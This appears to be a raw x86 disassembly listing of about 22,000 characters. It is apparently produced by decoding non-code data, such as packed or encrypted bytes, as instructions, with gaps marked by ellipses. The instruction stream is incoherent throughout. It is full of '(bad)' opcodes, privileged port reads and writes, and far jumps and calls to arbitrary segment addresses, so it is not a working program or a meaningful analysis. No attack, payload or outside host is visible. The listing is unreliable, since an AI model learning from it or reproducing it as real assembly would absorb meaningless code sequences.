  42ef25:	mov    dh,0xec
  42ef27:	mov    ds:0x1cb63f4f,eax
  42ef2c:	or     ch,BYTE PTR [ecx+0x6d]
  42ef2f:	jle    0x42ef5d
  42ef31:	mov    dl,BYTE PTR [edx-0x31]
  42ef34:	push   edi
  42ef35:	or     ebp,edi
  42ef37:	aam    0x66
  42ef39:	and    DWORD PTR [ebx+edx*2],ebx
  42ef3c:	ins    DWORD PTR es:[edi],dx
  42ef3d:	fstp   TBYTE PTR [esi-0x27e6d3ba]
  42ef43:	icebp  
  42ef44:	adc    bh,BYTE PTR [ecx]
  42ef46:	sub    eax,0x907bf66c
  42ef4b:	jge    0x42ef76
  42ef4d:	xlat   BYTE PTR ds:[ebx]
  42ef4e:	cmp    al,0x3b
  42ef50:	cmp    eax,0x7ed98ba
  42ef55:	imul   esp,DWORD PTR [ecx-0x72e2edcf],0x1
  42ef5c:	adc    al,0x39
  42ef5e:	fst    QWORD PTR [edi+eiz*1-0x5e21c75b]
  42ef65:	xor    al,0x74
  42ef67:	in     eax,dx
  42ef68:	xor    al,0xf4
  42ef6a:	retf   0x1568
  42ef6d:	cld    
  42ef6e:	cmp    bl,BYTE PTR [esi+0x7a5bdd9a]
  42ef74:	mov    ah,0xea
  42ef76:	adc    al,0xd8
  42ef78:	(bad)  
  42ef79:	mov    esi,es
  42ef7b:	js     0x42ef6e
  42ef7d:	xor    al,0x43
  42ef7f:	setnp  BYTE PTR [esi+0x2e]
  42ef83:	pop    esp
  42ef84:	out    dx,eax
  42ef85:	aad    0xde
  42ef87:	ret    0x8b09
  42ef8a:	pushf  
  42ef8b:	vmaxps xmm6,xmm6,XMMWORD PTR [ebx-0x3de473a0]
  42ef93:	int    0xb4
  42ef95:	inc    esi
  42ef96:	xchg   ebp,eax
  42ef97:	idiv   BYTE PTR [edx+ebx*4-0x247e45f3]
  42ef9e:	aas    
  42ef9f:	xchg   ah,cl
  42efa1:	xor    al,0x36
  42efa3:	mov    ds:0x50cd33e8,al
  42efa8:	scas   al,BYTE PTR es:[edi]
  42efa9:	jg     0x42ef86
  42efab:	or     eax,0xd333235e
  42efb0:	inc    esp
  42efb1:	mov    WORD PTR [eax+0x70717d32],ds
  42efb7:	jne    0x42efce
  42efb9:	xor    DWORD PTR [esi+0x5200aaef],esi
  42efbf:	fstp   DWORD PTR [ecx]
  42efc1:	sub    edx,DWORD PTR [eax-0x1121747e]
  42efc7:	fisttp QWORD PTR [eax]
  42efc9:	mov    ch,0xac
  42efcb:	push   ebx
  42efcc:	(bad)  
  42efcd:	push   ebx
  42efce:	in     al,dx
  42efcf:	xlat   BYTE PTR gs:[ebx]
  42efd1:	adc    esp,DWORD PTR [eax]
  42efd3:	push   0xffffff80
  42efd5:	gs or  eax,0x471af629
  42efdb:	add    cl,al
  42efdd:	mov    edx,0x97f2b285
  42efe2:	push   es
  42efe3:	fld    TBYTE PTR [ebx-0x472e6bdb]
  42efe9:	ins    BYTE PTR es:[edi],dx
  42efea:	sbb    ebx,ebp
  42efec:	jge    0x42f02d
  42efee:	pop    ds
  42efef:	add    al,0x36
  42eff1:	or     esp,DWORD PTR [eax]
  42eff3:	xor    eax,0x99573bc7
  42eff8:	jno    0x42ef8f
  42effa:	retf   
  42effb:	repz pusha 
  42effd:	jo     0x42eff8
  42efff:	push   cs
  42f000:	daa    
  42f001:	pop    ds
  42f002:	cmp    dl,ch
  42f004:	dec    esp
  42f005:	fs inc ebx
  42f007:	lods   al,BYTE PTR ds:[esi]
  42f008:	inc    ebx
  42f009:	sbb    ebx,edx
  42f00b:	jecxz  0x42ef94
  42f00d:	repnz mov cs,WORD PTR [eax+0xe3]
	...
  42f074:	adc    bh,BYTE PTR [esi]
  42f076:	int    0xe5
  42f078:	in     eax,dx
  42f079:	idiv   DWORD PTR [edx]
  42f07b:	(bad)  
  42f07c:	js     0x42f081
  42f07e:	mov    DWORD PTR [ecx],ecx
  42f080:	mov    al,0x96
  42f082:	dec    esi
  42f083:	push   ecx
  42f084:	cmp    eax,0x1050001
  42f08a:	add    BYTE PTR [eax],al
  42f08c:	pushf  
  42f08d:	shr    BYTE PTR [ecx+0x2deeac3f],0x4
  42f094:	xchg   esi,eax
  42f095:	dec    esp
  42f096:	sbb    eax,0x62e8755a
  42f09b:	dec    ebp
  42f09c:	jb     0x42f0d6
  42f09e:	push   ebx
  42f09f:	push   ds
  42f0a0:	push   edi
  42f0a1:	jbe    0x42f0b9
  42f0a3:	xchg   eax,esp
  42f0a5:	cmp    ebp,eax
  42f0a7:	test   al,0xf4
  42f0a9:	in     eax,0xee
  42f0ab:	push   ebp
  42f0ac:	mov    ds:0xcd88c96f,eax
  42f0b1:	sub    DWORD PTR [edi],ecx
  42f0b3:	rol    BYTE PTR [ebp-0x23],0xaf
  42f0b7:	jmp    0x868a:0x1788beaa
  42f0be:	inc    esp
  42f0bf:	sti    
  42f0c0:	ds (bad) 
  42f0c2:	loope  0x42f11a
  42f0c4:	jns    0x42f079
  42f0c6:	shl    DWORD PTR [esi-0x1b],0xab
  42f0ca:	fcom   DWORD PTR [ecx-0x3708ce57]
  42f0d0:	loope  0x42f09d
  42f0d2:	mov    eax,DWORD PTR [edx+edx*2]
  42f0d5:	jge    0x42f086
  42f0d7:	sbb    BYTE PTR [ebp+0x112438ae],ah
  42f0dd:	or     edi,ecx
  42f0df:	outs   dx,DWORD PTR ds:[esi]
  42f0e0:	or     al,0xcb
  42f0e2:	rcr    DWORD PTR [edx+0x4a],0x7b
  42f0e6:	pushf  
  42f0e7:	cdq    
  42f0e8:	pop    edx
  42f0e9:	popa   
  42f0ea:	xchg   BYTE PTR [eax-0x3f1aa2e5],ch
  42f0f0:	and    esi,DWORD PTR [edi]
  42f0f2:	lods   al,BYTE PTR ds:[esi]
  42f0f3:	sub    cl,ch
  42f0f5:	add    al,0x23
  42f0f7:	icebp  
  42f0f8:	dec    eax
  42f0f9:	add    DWORD PTR [edi+eiz*1],esp
  42f0fc:	fwait
  42f0fd:	xor    al,0x79
  42f0ff:	xor    dh,BYTE PTR [ecx+0x3d6f5351]
  42f105:	ds mov dl,0xd2
  42f108:	js     0x42f172
  42f10a:	aad    0x5f
  42f10c:	cli    
  42f10d:	inc    edx
  42f10e:	dec    ebp
  42f10f:	test   al,0xdb
  42f111:	lock pop ds
  42f113:	je     0x42f0aa
  42f115:	xchg   esp,eax
  42f116:	jecxz  0x42f15e
  42f118:	lods   al,BYTE PTR ds:[esi]
  42f119:	cmp    edx,DWORD PTR [ebx]
  42f11b:	jle    0x42f0e6
  42f11d:	adc    dl,BYTE PTR [eax]
  42f11f:	mov    ds:0x171ab082,eax
  42f124:	sbb    BYTE PTR [eax],ah
  42f126:	ins    BYTE PTR es:[edi],dx
  42f127:	ja     0x42f10e
  42f129:	push   esp
  42f12a:	test   eax,0x657fb326
  42f12f:	pusha  
  42f130:	(bad)  [edi+eiz*8]
  42f133:	and    eax,0x9bf886f5
  42f138:	cmp    BYTE PTR [ecx-0x48],bl
  42f13b:	push   0x58
  42f13d:	jno    0x42f166
  42f13f:	arpl   si,dx
  42f141:	xlat   BYTE PTR ds:[ebx]
  42f142:	mov    bh,0x36
  42f144:	(bad)  
  42f145:	out    0x7d,al
  42f147:	test   eax,0xd8816f53
  42f14c:	aam    0x67
  42f14e:	cmp    ch,BYTE PTR [ebp+0x60]
  42f151:	xchg   eax,ecx
  42f153:	test   DWORD PTR [esi+0x4b],ebx
  42f156:	add    ah,bh
  42f158:	and    eax,0x67928228
  42f15d:	ins    BYTE PTR es:[edi],dx
  42f15e:	pop    ecx
  42f15f:	sar    ebx,cl
  42f161:	lahf   
  42f162:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f163:	inc    ebp
  42f164:	call   0x767b:0x724a2c35
  42f16b:	rcr    DWORD PTR [ebx],0x4e
  42f16e:	and    al,0xa7
  42f170:	jno    0x42f1cc
  42f172:	ja     0x42f1c1
  42f174:	jnp    0x42f14e
  42f176:	mov    dl,0x36
  42f178:	popa   
  42f179:	jp     0x42f17b
  42f17b:	(bad)  [eax+0x2f]
  42f17e:	mov    ebx,DWORD PTR [ecx+0xc]
  42f181:	pop    es
  42f182:	sub    bh,BYTE PTR [esi]
  42f184:	pop    ecx
  42f185:	sbb    al,0x52
  42f187:	sti    
  42f188:	pop    edi
  42f189:	(bad)  
  42f18a:	sub    cl,dh
  42f18c:	mov    al,BYTE PTR [ebx+eax*1+0x57]
  42f190:	aam    0x0
	...
  42f1f2:	add    BYTE PTR [eax],al
  42f1f4:	pop    edx
  42f1f5:	es jecxz 0x42f23b
  42f1f8:	inc    edi
  42f1fa:	cli    
  42f1fb:	aas    
  42f1fc:	into   
  42f1fd:	retf   0x3f8e
  42f200:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f201:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f202:	loopne 0x42f264
  42f204:	xchg   cl,bh
  42f206:	add    DWORD PTR [eax],eax
  42f208:	add    eax,0xfb000001
  42f20d:	push   edi
  42f20e:	mov    dh,0xfb
  42f210:	cmp    eax,0xda86ec19
  42f215:	shl    BYTE PTR [ebx-0x77],1
  42f218:	or     DWORD PTR [esi+eiz*2],0xcb7d4545
  42f21f:	or     BYTE PTR [edi-0x1c],ah
  42f222:	fadd   DWORD PTR [eax]
  42f224:	mov    edi,0xfcd3b390
  42f229:	aaa    
  42f22a:	sbb    DWORD PTR [esi+0x7ed78a0],edi
  42f230:	pop    esp
  42f231:	xchg   BYTE PTR [ebp+0x5054b6f7],bl
  42f237:	adc    al,0x59
  42f239:	loop   0x42f223
  42f23b:	popf   
  42f23c:	daa    
  42f23d:	adc    ch,BYTE PTR [edi-0x33ea2670]
  42f243:	loope  0x42f1d9
  42f245:	setno  BYTE PTR [ecx+0x1]
  42f249:	pop    ebx
  42f24a:	cmp    ebp,DWORD PTR [edi]
  42f24c:	dec    ebp
  42f24d:	or     al,0xc3
  42f24f:	imul   edi,DWORD PTR fs:[esi+0x34b0503c],0xffffff80
  42f257:	fcom   QWORD PTR [esi-0x68dbd321]
  42f25d:	repnz scas eax,DWORD PTR es:[edi]
  42f25f:	jecxz  0x42f2e0
  42f261:	int3   
  42f262:	iret   
  42f263:	mov    BYTE PTR [esi-0x58],ch
  42f266:	dec    ecx
  42f267:	je     0x42f22e
  42f269:	outs   dx,DWORD PTR ds:[esi]
  42f26a:	js     0x42f24d
  42f26c:	in     eax,dx
  42f26d:	push   cs
  42f26e:	push   esi
  42f26f:	add    al,0xef
  42f271:	xchg   edi,edi
  42f273:	loope  0x42f1fc
  42f275:	sbb    DWORD PTR [eax+0x3de4676f],esi
  42f27b:	shl    DWORD PTR [edi],cl
  42f27d:	icebp  
  42f27e:	and    BYTE PTR [eax+0x28373ad0],dl
  42f284:	sub    ch,BYTE PTR [edi-0x102c23e7]
  42f28a:	icebp  
  42f28b:	mov    cl,bh
  42f28d:	lods   al,BYTE PTR ds:[esi]
  42f28e:	cdq    
  42f28f:	jmp    0x42f2e1
  42f291:	sbb    eax,0xb0768bd6
  42f296:	jge    0x42f27c
  42f298:	inc    edx
  42f299:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f29a:	or     ebp,DWORD PTR [esi-0x291d4b32]
  42f2a0:	push   cs
  42f2a1:	stos   DWORD PTR es:[edi],eax
  42f2a2:	imul   edi,DWORD PTR [ebp-0x4b],0x41
  42f2a6:	adc    ah,0x20
  42f2a9:	shl    DWORD PTR [edi],cl
  42f2ab:	xor    bl,ah
  42f2ad:	sub    dl,BYTE PTR [edx-0x44bc969]
  42f2b3:	neg    DWORD PTR [esi-0x63dab9d2]
  42f2b9:	inc    edi
  42f2ba:	dec    eax
  42f2bb:	das    
  42f2bc:	push   ebx
  42f2bd:	pop    edi
  42f2be:	mov    eax,0xe5cd771c
  42f2c3:	push   cs
  42f2c4:	push   eax
  42f2c5:	sbb    eax,0x1ba4a9b1
  42f2ca:	and    DWORD PTR [edx-0x3e],edi
  42f2cd:	jp     0x42f32d
  42f2cf:	jl     0x42f320
  42f2d1:	xchg   ebx,eax
  42f2d2:	push   eax
  42f2d3:	dec    eax
  42f2d4:	and    BYTE PTR [edx-0x3e],ch
  42f2d7:	pushf  
  42f2d8:	out    0xf,al
  42f2da:	adc    DWORD PTR [esi],0x6f
  42f2dd:	mov    ds:0x8c16fdac,eax
  42f2e2:	pop    esp
  42f2e3:	daa    
  42f2e4:	cdq    
  42f2e5:	aad    0x89
  42f2e7:	test   BYTE PTR [ecx],0xab
  42f2ea:	mov    esi,0x548618ea
  42f2ef:	push   edi
  42f2f0:	pop    edx
  42f2f1:	test   al,0xac
  42f2f3:	jbe    0x42f371
  42f2f5:	pop    ecx
  42f2f6:	out    0xa0,al
  42f2f8:	xlat   BYTE PTR ds:[ebx]
  42f2f9:	cwde   
  42f2fa:	inc    edx
  42f2fb:	add    al,0x32
  42f2fd:	jb     0x42f296
  42f2ff:	ret    
  42f300:	inc    ecx
  42f301:	push   cs
  42f302:	ins    DWORD PTR es:[edi],dx
  42f303:	gs jg  0x42f383
  42f306:	nop
  42f307:	mov    bl,0xf3
  42f309:	jae    0x42f2a4
  42f30b:	sub    BYTE PTR [eax-0x55],bh
  42f30e:	test   BYTE PTR [eax-0x2a],dh
	...
  42f371:	add    BYTE PTR [eax],al
  42f373:	add    BYTE PTR [ebp-0x5075f7e6],bh
  42f379:	call   0xcc3a:0x5ac03fbf
  42f380:	mov    eax,ds:0x8b19770b
  42f385:	cli    
  42f386:	add    DWORD PTR [eax],eax
  42f388:	add    eax,0x68000001
  42f38d:	mov    ebx,0xa29150d5
  42f392:	and    BYTE PTR [edx-0x29],al
  42f395:	sti    
  42f396:	dec    ecx
  42f397:	add    eax,0xa0c0fda4
  42f39c:	inc    ebp
  42f39d:	(bad)  
  42f39e:	faddp  st(4),st
  42f3a0:	shr    DWORD PTR [ebp-0x456d4599],1
  42f3a6:	adc    dh,dl
  42f3a8:	dec    eax
  42f3a9:	or     BYTE PTR [eax-0x6e],0xfb
  42f3ad:	dec    ch
  42f3af:	and    al,0xad
  42f3b1:	daa    
  42f3b2:	and    edx,DWORD PTR [ebp+0x38]
  42f3b5:	(bad)  
  42f3b6:	push   ebx
  42f3b7:	in     al,0x2a
  42f3b9:	push   cs
  42f3ba:	int    0x64
  42f3bc:	in     eax,0x1f
  42f3be:	pop    es
  42f3bf:	jae    0x42f430
  42f3c1:	dec    esi
  42f3c2:	mov    eax,ds:0x4916f59f
  42f3c7:	jo     0x42f3b9
  42f3c9:	cmp    esi,DWORD PTR [ebp-0x3c]
  42f3cc:	loopne 0x42f36f
  42f3ce:	in     eax,dx
  42f3cf:	xor    esi,DWORD PTR [edx]
  42f3d1:	pop    esi
  42f3d2:	fwait
  42f3d3:	stos   BYTE PTR es:[edi],al
  42f3d4:	xchg   esi,eax
  42f3d5:	bound  esi,QWORD PTR [edx+0x448aaf70]
  42f3db:	xor    BYTE PTR [esi-0x52],bh
  42f3de:	lds    ecx,FWORD PTR [eax+0xfde993c]
  42f3e4:	and    ah,BYTE PTR [esp]
  42f3e7:	lods   eax,DWORD PTR ds:[esi]
  42f3e8:	and    dl,BYTE PTR [edi+0x356be64]
  42f3ee:	xor    bl,BYTE PTR [ecx+0x4a]
  42f3f1:	push   ss
  42f3f2:	cdq    
  42f3f3:	sbb    ah,ch
  42f3f5:	or     BYTE PTR [ebx],cl
  42f3f7:	sti    
  42f3f8:	popa   
  42f3f9:	mov    edx,0xf07ab2af
  42f3fe:	push   ebp
  42f3ff:	lea    ebp,[ecx+0xc]
  42f402:	push   esp
  42f403:	imul   esp,DWORD PTR [ebx-0xa6328bd],0x3b3dd53a
  42f40d:	push   esi
  42f40e:	pop    ds
  42f40f:	mov    al,BYTE PTR [ebp-0x3ca1535c]
  42f415:	push   edi
  42f416:	sbb    al,0xa4
  42f418:	mov    es,WORD PTR [ecx-0xbd6ac97]
  42f41e:	push   ss
  42f41f:	mov    edx,ebp
  42f421:	sbb    ebx,DWORD PTR [ebx-0x6f]
  42f424:	or     al,0x9c
  42f426:	psadbw mm6,mm6
  42f429:	popf   
  42f42a:	shl    BYTE PTR [eax+eiz*4+0x73],0x26
  42f42f:	dec    edi
  42f430:	fimul  DWORD PTR [edi]
  42f432:	lods   eax,DWORD PTR ds:[esi]
  42f433:	xlat   BYTE PTR ds:[ebx]
  42f434:	mov    al,0x68
  42f436:	add    eax,0x1ec73f1d
  42f43b:	inc    ebp
  42f43c:	jle    0x42f495
  42f43e:	mov    cl,0xa8
  42f440:	xchg   edi,eax
  42f441:	jne    0x42f3d2
  42f443:	add    al,0xcb
  42f445:	inc    eax
  42f446:	ds cli 
  42f448:	aas    
  42f449:	pop    esp
  42f44a:	push   esp
  42f44b:	sbb    eax,0x8a575fed
  42f450:	loopne 0x42f3e9
  42f452:	out    dx,al
  42f453:	add    al,0xd1
  42f455:	jge    0x42f3d8
  42f457:	test   al,0xb3
  42f459:	inc    esi
  42f45a:	xor    al,0x82
  42f45c:	mov    DWORD PTR [eax-0x33],edx
  42f45f:	and    al,0x90
  42f461:	pop    edx
  42f462:	pop    edi
  42f463:	les    esp,FWORD PTR [edx-0x5492a899]
  42f469:	and    eax,0xfa0e191e
  42f46e:	fs cdq 
  42f470:	stos   DWORD PTR es:[edi],eax
  42f471:	scas   eax,DWORD PTR es:[edi]
  42f472:	pop    ss
  42f473:	int    0xff
  42f475:	aas    
  42f476:	stos   DWORD PTR es:[edi],eax
  42f477:	loopne 0x42f446
  42f479:	lahf   
  42f47a:	mov    esi,0x244c78c3
  42f47f:	mov    ebp,DWORD PTR [edx-0x282f1665]
  42f485:	jmp    0x42f4a4
  42f487:	ins    BYTE PTR es:[edi],dx
  42f488:	inc    eax
  42f489:	std    
  42f48a:	sub    ch,BYTE PTR [eax+0x5b]
  42f48d:	xlat   BYTE PTR ds:[ebx]
  42f48e:	xlat   BYTE PTR fs:[ebx]
  42f490:	fld    DWORD PTR [eax]
	...
  42f4f2:	add    BYTE PTR [eax],al
  42f4f4:	aaa    
  42f4f5:	jae    0x42f541
  42f4f7:	cdq    
  42f4f8:	dec    esi
  42f4f9:	mov    ecx,0x13f4fff7
  42f4fe:	jno    0x42f52f
  42f500:	inc    esi
  42f501:	and    al,0xbb
  42f503:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f504:	nop
  42f505:	sti    
  42f506:	add    DWORD PTR [eax],eax
  42f508:	add    eax,0xa000001
  42f50d:	test   al,0x7b
  42f50f:	sub    al,0x5d
  42f511:	cmp    ebp,DWORD PTR [ecx+esi*4+0x3b854f59]
  42f518:	dec    edx
  42f519:	add    BYTE PTR [ecx+ecx*1+0x21a0c73b],0xdb
  42f521:	stos   BYTE PTR es:[edi],al
  42f522:	iret   
  42f523:	mov    dl,0x26
  42f525:	cli    
  42f526:	xor    eax,edx
  42f528:	pop    ecx
  42f529:	pop    es
  42f52a:	adc    eax,0x9c988918
  42f52f:	(bad)  
  42f530:	and    al,0x2b
  42f532:	ret    0x98fc
  42f535:	push   es
  42f536:	dec    eax
  42f537:	xchg   ebp,eax
  42f538:	repz test eax,0xdfb7aa87
  42f53e:	jp     0x42f51b
  42f540:	adc    eax,0x61887f11
  42f545:	fstp   DWORD PTR [edx-0x4d]
  42f548:	xor    eax,0x6c981537
  42f54d:	sub    dl,BYTE PTR [ebx+0x75c20ed9]
  42f553:	outs   dx,BYTE PTR ds:[esi]
  42f554:	cmp    al,0xd3
  42f556:	jnp    0x42f4f7
  42f558:	xchg   ecx,eax
  42f559:	loope  0x42f5d3
  42f55b:	jge    0x42f537
  42f55d:	das    
  42f55e:	mov    ds:0xa09f60e4,eax
  42f563:	or     eax,0x7c7fb682
  42f568:	arpl   WORD PTR [ebp-0x49],di
  42f56b:	pushf  
  42f56c:	mov    bl,0x5d
  42f56e:	push   ebp
  42f56f:	lahf   
  42f570:	jg     0x42f55a
  42f572:	adc    eax,0xd8fd2308
  42f577:	lods   al,BYTE PTR ds:[esi]
  42f578:	repz shl DWORD PTR [eax+eax*2-0x7b549d6e],1
  42f580:	fistp  QWORD PTR [edi]
  42f582:	aaa    
  42f583:	jns    0x42f56e
  42f585:	popf   
  42f586:	rol    cl,cl
  42f588:	jmp    0x42f50b
  42f58a:	stc    
  42f58b:	lahf   
  42f58c:	ret    0x892e
  42f58f:	cdq    
  42f590:	jge    0x42f604
  42f592:	xor    al,0xde
  42f594:	mov    DWORD PTR [edx+0x16],esi
  42f597:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f598:	mov    ds:0x98c07c5c,eax
  42f59d:	outs   dx,DWORD PTR ds:[esi]
  42f59e:	xor    al,0x86
  42f5a0:	sub    eax,DWORD PTR [edi+0x2efb3f31]
  42f5a6:	nop    eax
  42f5a9:	dec    esp
  42f5aa:	fdivr  DWORD PTR [esi-0x687ad155]
  42f5b0:	leave  
  42f5b1:	mov    edx,0xd3e1fcc4
  42f5b6:	lods   al,BYTE PTR ds:[esi]
  42f5b7:	mov    ecx,0x942c0648
  42f5bc:	lock inc ebp
  42f5be:	repnz fwait
  42f5c0:	sbb    esi,DWORD PTR [esi+0x608f0e4c]
  42f5c6:	fcom   st(5)
  42f5c8:	pop    es
  42f5c9:	je     0x42f61d
  42f5cb:	scas   al,BYTE PTR es:[edi]
  42f5cc:	int    0x1d
  42f5ce:	pop    es
  42f5cf:	sub    cl,BYTE PTR [eax]
  42f5d1:	inc    ebp
  42f5d2:	test   al,0xa
  42f5d4:	xchg   esi,eax
  42f5d5:	xchg   ebx,eax
  42f5d6:	xchg   esi,eax
  42f5d7:	cli    
  42f5d8:	scas   eax,DWORD PTR es:[edi]
  42f5d9:	addr16 push esi
  42f5db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f5dc:	xchg   bl,dh
  42f5de:	push   edx
  42f5df:	popa   
  42f5e0:	pop    ecx
  42f5e1:	adc    DWORD PTR [edx],0xd7494f71
  42f5e7:	pop    es
  42f5e8:	mov    al,ds:0x2765d408
  42f5ed:	repnz neg DWORD PTR [ebx-0x400009dc]
  42f5f4:	daa    
  42f5f5:	mov    edx,0xbd5236f3
  42f5fa:	dec    esi
  42f5fb:	mov    ebx,0x9601cbee
  42f600:	mov    eax,ds:0x5f6ba2ed
  42f605:	sub    DWORD PTR [ebx+ebp*1-0x15],esi
  42f609:	jmp    0xd97c:0x18fd4f5
  42f610:	leave  
	...
  42f671:	add    BYTE PTR [eax],al
  42f673:	add    BYTE PTR [esi],bh
  42f675:	push   esi
  42f676:	into   
  42f677:	nop
  42f678:	out    dx,al
  42f679:	cwde   
  42f67a:	jle    0x42f67a
  42f67c:	push   eax
  42f67d:	sub    edx,esi
  42f67f:	dec    esp
  42f680:	pushf  
  42f681:	jl     0x23f8c3e
  42f687:	add    BYTE PTR ds:0x6b000001,al
  42f68d:	add    al,0x76
  42f68f:	dec    ebx
  42f690:	mov    eax,0xf6d35f46
  42f695:	sahf   
  42f696:	sub    BYTE PTR [ebx],bl
  42f698:	jl     0x42f675
  42f69a:	or     ecx,DWORD PTR [ebx]
  42f69c:	sahf   
  42f69d:	cmp    DWORD PTR [edi-0x5d021d49],ebx
  42f6a3:	ins    DWORD PTR es:[edi],dx
  42f6a4:	sti    
  42f6a5:	shl    al,1
  42f6a7:	push   esp
  42f6a8:	(bad)  
  42f6a9:	xor    DWORD PTR [ebp-0x7c],esi
  42f6ac:	pop    ebx
  42f6ad:	cmp    al,0xc4
  42f6af:	dec    esp
  42f6b0:	add    eax,0x68353a06
  42f6b5:	in     al,dx
  42f6b6:	mov    dl,0x1c
  42f6b8:	cmp    ebp,DWORD PTR [edi]
  42f6ba:	fnsave [edx]
  42f6bc:	xor    edx,DWORD PTR [ebx+0xc3e6e27]
  42f6c2:	and    al,0xe3
  42f6c4:	mov    dl,0x0
  42f6c6:	inc    esp
  42f6c7:	xor    eax,0xe076dc50
  42f6cc:	add    DWORD PTR [eax],esp
  42f6ce:	xor    DWORD PTR [esi+0x69e11500],edi
  42f6d4:	dec    edx
  42f6d5:	jmp    0x3cae:0x7333bad
  42f6dc:	and    bh,BYTE PTR [ecx]
  42f6de:	inc    ebx
  42f6df:	jge    0x42f748
  42f6e1:	mov    eax,ds:0xaf7aa246
  42f6e6:	or     DWORD PTR [eax],0x2008bdac
  42f6ec:	loop   0x42f6c0
  42f6ee:	lods   eax,DWORD PTR ds:[esi]
  42f6ef:	xor    ecx,DWORD PTR [eax]
  42f6f1:	dec    edx
  42f6f2:	shl    BYTE PTR [edx+ebp*8+0x489947bb],0x74
  42f6fa:	jp     0x42f751
  42f6fc:	sub    BYTE PTR ds:0x3d48ba5b,bl
  42f702:	sti    
  42f703:	add    dh,dl
  42f705:	ja     0x42f760
  42f707:	add    al,0x5f
  42f709:	jle    0x42f6b5
  42f70b:	or     bh,BYTE PTR [ecx+0x3882b18f]
  42f711:	cwde   
  42f712:	add    bh,0x7c
  42f715:	mov    eax,ds:0xf874f440
  42f71a:	fidiv  DWORD PTR [edi]
  42f71c:	cld    
  42f71d:	sub    DWORD PTR [eax],edx
  42f71f:	push   es
  42f720:	adc    ch,cl
  42f722:	sub    edi,ebp
  42f724:	jmp    0x42f6bc
  42f726:	push   eax
  42f727:	dec    esi
  42f728:	int3   
  42f729:	pop    ds
  42f72a:	dec    eax
  42f72b:	sar    DWORD PTR [esi-0x6458bdcd],0x52
  42f732:	add    DWORD PTR [edi],ebp
  42f734:	jge    0x42f6d4
  42f736:	jns    0x42f6ca
  42f738:	xchg   edx,eax
  42f739:	or     BYTE PTR [eax-0x29],bh
  42f73c:	jnp    0x42f7a2
  42f73e:	pusha  
  42f73f:	inc    edx
  42f740:	ret    0x48ad
  42f743:	mov    bh,0xb
  42f745:	inc    eax
  42f746:	hlt    
  42f747:	mov    DWORD PTR [ecx],ebx
  42f749:	xor    BYTE PTR [edi-0x2f],0x7a
  42f74d:	add    al,0xa5
  42f74f:	aad    0xa3
  42f751:	lds    ebp,FWORD PTR [edi-0x47e3e6fd]
  42f757:	inc    eax
  42f758:	mov    ds:0x5e6a7b10,eax
  42f75d:	cmp    ah,dh
  42f75f:	inc    eax
  42f760:	xor    ecx,DWORD PTR [edi+0x670283c9]
  42f766:	inc    ecx
  42f767:	addr16 dec esi
  42f769:	outs   dx,BYTE PTR ds:[esi]
  42f76a:	mov    WORD PTR [ebp-0x21],ss
  42f76d:	test   esp,edi
  42f76f:	or     al,0x4f
  42f771:	sub    edi,esi
  42f773:	dec    ebp
  42f774:	push   ecx
  42f775:	hlt    
  42f776:	enter  0x6310,0xec
  42f77a:	std    
  42f77b:	aad    0x11
  42f77d:	cmc    
  42f77e:	test   DWORD PTR [ecx-0x40],esp
  42f781:	mov    eax,0x80fe2540
  42f786:	test   BYTE PTR [edx],dh
  42f788:	push   esi
  42f789:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f78a:	adc    edx,DWORD PTR [edi+0x303e4f22]
  42f790:	pop    ebp
	...
  42f7f1:	add    BYTE PTR [eax],al
  42f7f3:	add    BYTE PTR [ecx-0x5f],dh
  42f7f6:	(bad)  
  42f7f7:	test   al,0xd6
  42f7f9:	(bad)  
  42f7fa:	jg     0x42f7f5
  42f7fc:	push   cs
  42f7fd:	pop    ebp
  42f7fe:	push   ebp
  42f7ff:	mov    edi,0x7720217a
  42f804:	call   0x1:0x50001fd
  42f80b:	add    BYTE PTR [ebx+0x1d],cl
  42f80e:	cmp    eax,0xfd41e34f
  42f813:	cmp    dl,BYTE PTR [eax]
  42f815:	pop    ds
  42f816:	and    DWORD PTR [ebp-0x286470be],edx
  42f81c:	pop    edx
  42f81d:	cmp    DWORD PTR [edi+0x43e27b14],0xffffffce
  42f824:	xchg   dh,ah
  42f826:	in     eax,dx
  42f827:	ror    BYTE PTR [edi-0x4d],cl
  42f82a:	std    
  42f82b:	and    DWORD PTR [ebx-0x40238719],ebp
  42f831:	xchg   esi,eax
  42f832:	out    0xdd,al
  42f834:	dec    esi
  42f835:	sbb    ecx,DWORD PTR [ebp+0x2c]
  42f838:	xor    eax,DWORD PTR [edi+0x68d0a17f]
  42f83e:	int3   
  42f83f:	adc    BYTE PTR [edi],dl
  42f841:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f842:	cli    
  42f843:	fistp  DWORD PTR [ecx]
  42f845:	iret   
  42f846:	add    cl,BYTE PTR [ebx+0x33fd351d]
  42f84c:	fild   QWORD PTR [edi+0x5]
  42f84f:	es nop
  42f851:	cmp    BYTE PTR [esi+eax*2],ah
  42f854:	mov    dl,0x7e
  42f856:	leave  
  42f857:	mov    dl,0xe2
  42f859:	or     ecx,0xfffffff9
  42f85c:	jae    0x42f800
  42f85e:	or     eax,0x83383fb8
  42f863:	bound  ecx,QWORD PTR [edx+0x39]
  42f866:	dec    esp
  42f867:	inc    ecx
  42f868:	imul   eax,DWORD PTR [edi+0x7],0x57
  42f86c:	(bad)  
  42f86e:	xlat   BYTE PTR ds:[ebx]
  42f86f:	adc    eax,0x9d93a2cb
  42f874:	imul   ecx
  42f876:	and    eax,0x73742ff2
  42f87b:	inc    edi
  42f87c:	sub    esi,ebp
  42f87e:	push   es
  42f87f:	(bad)  [eax+ebp*1]
  42f882:	adc    bl,BYTE PTR [edi]
  42f884:	jnp    0x42f835
  42f886:	and    eax,edi
  42f888:	push   ds
  42f889:	leave  
  42f88a:	jns    0x42f8e0
  42f88c:	bound  esi,QWORD PTR [ebx-0x7252cf00]
  42f892:	cwde   
  42f893:	xchg   esp,eax
  42f894:	sbb    eax,0x67669b55
  42f899:	cdq    
  42f89a:	xchg   DWORD PTR [ecx+0x23],ebp
  42f89d:	lock mov ds:0x48a4fb91,eax
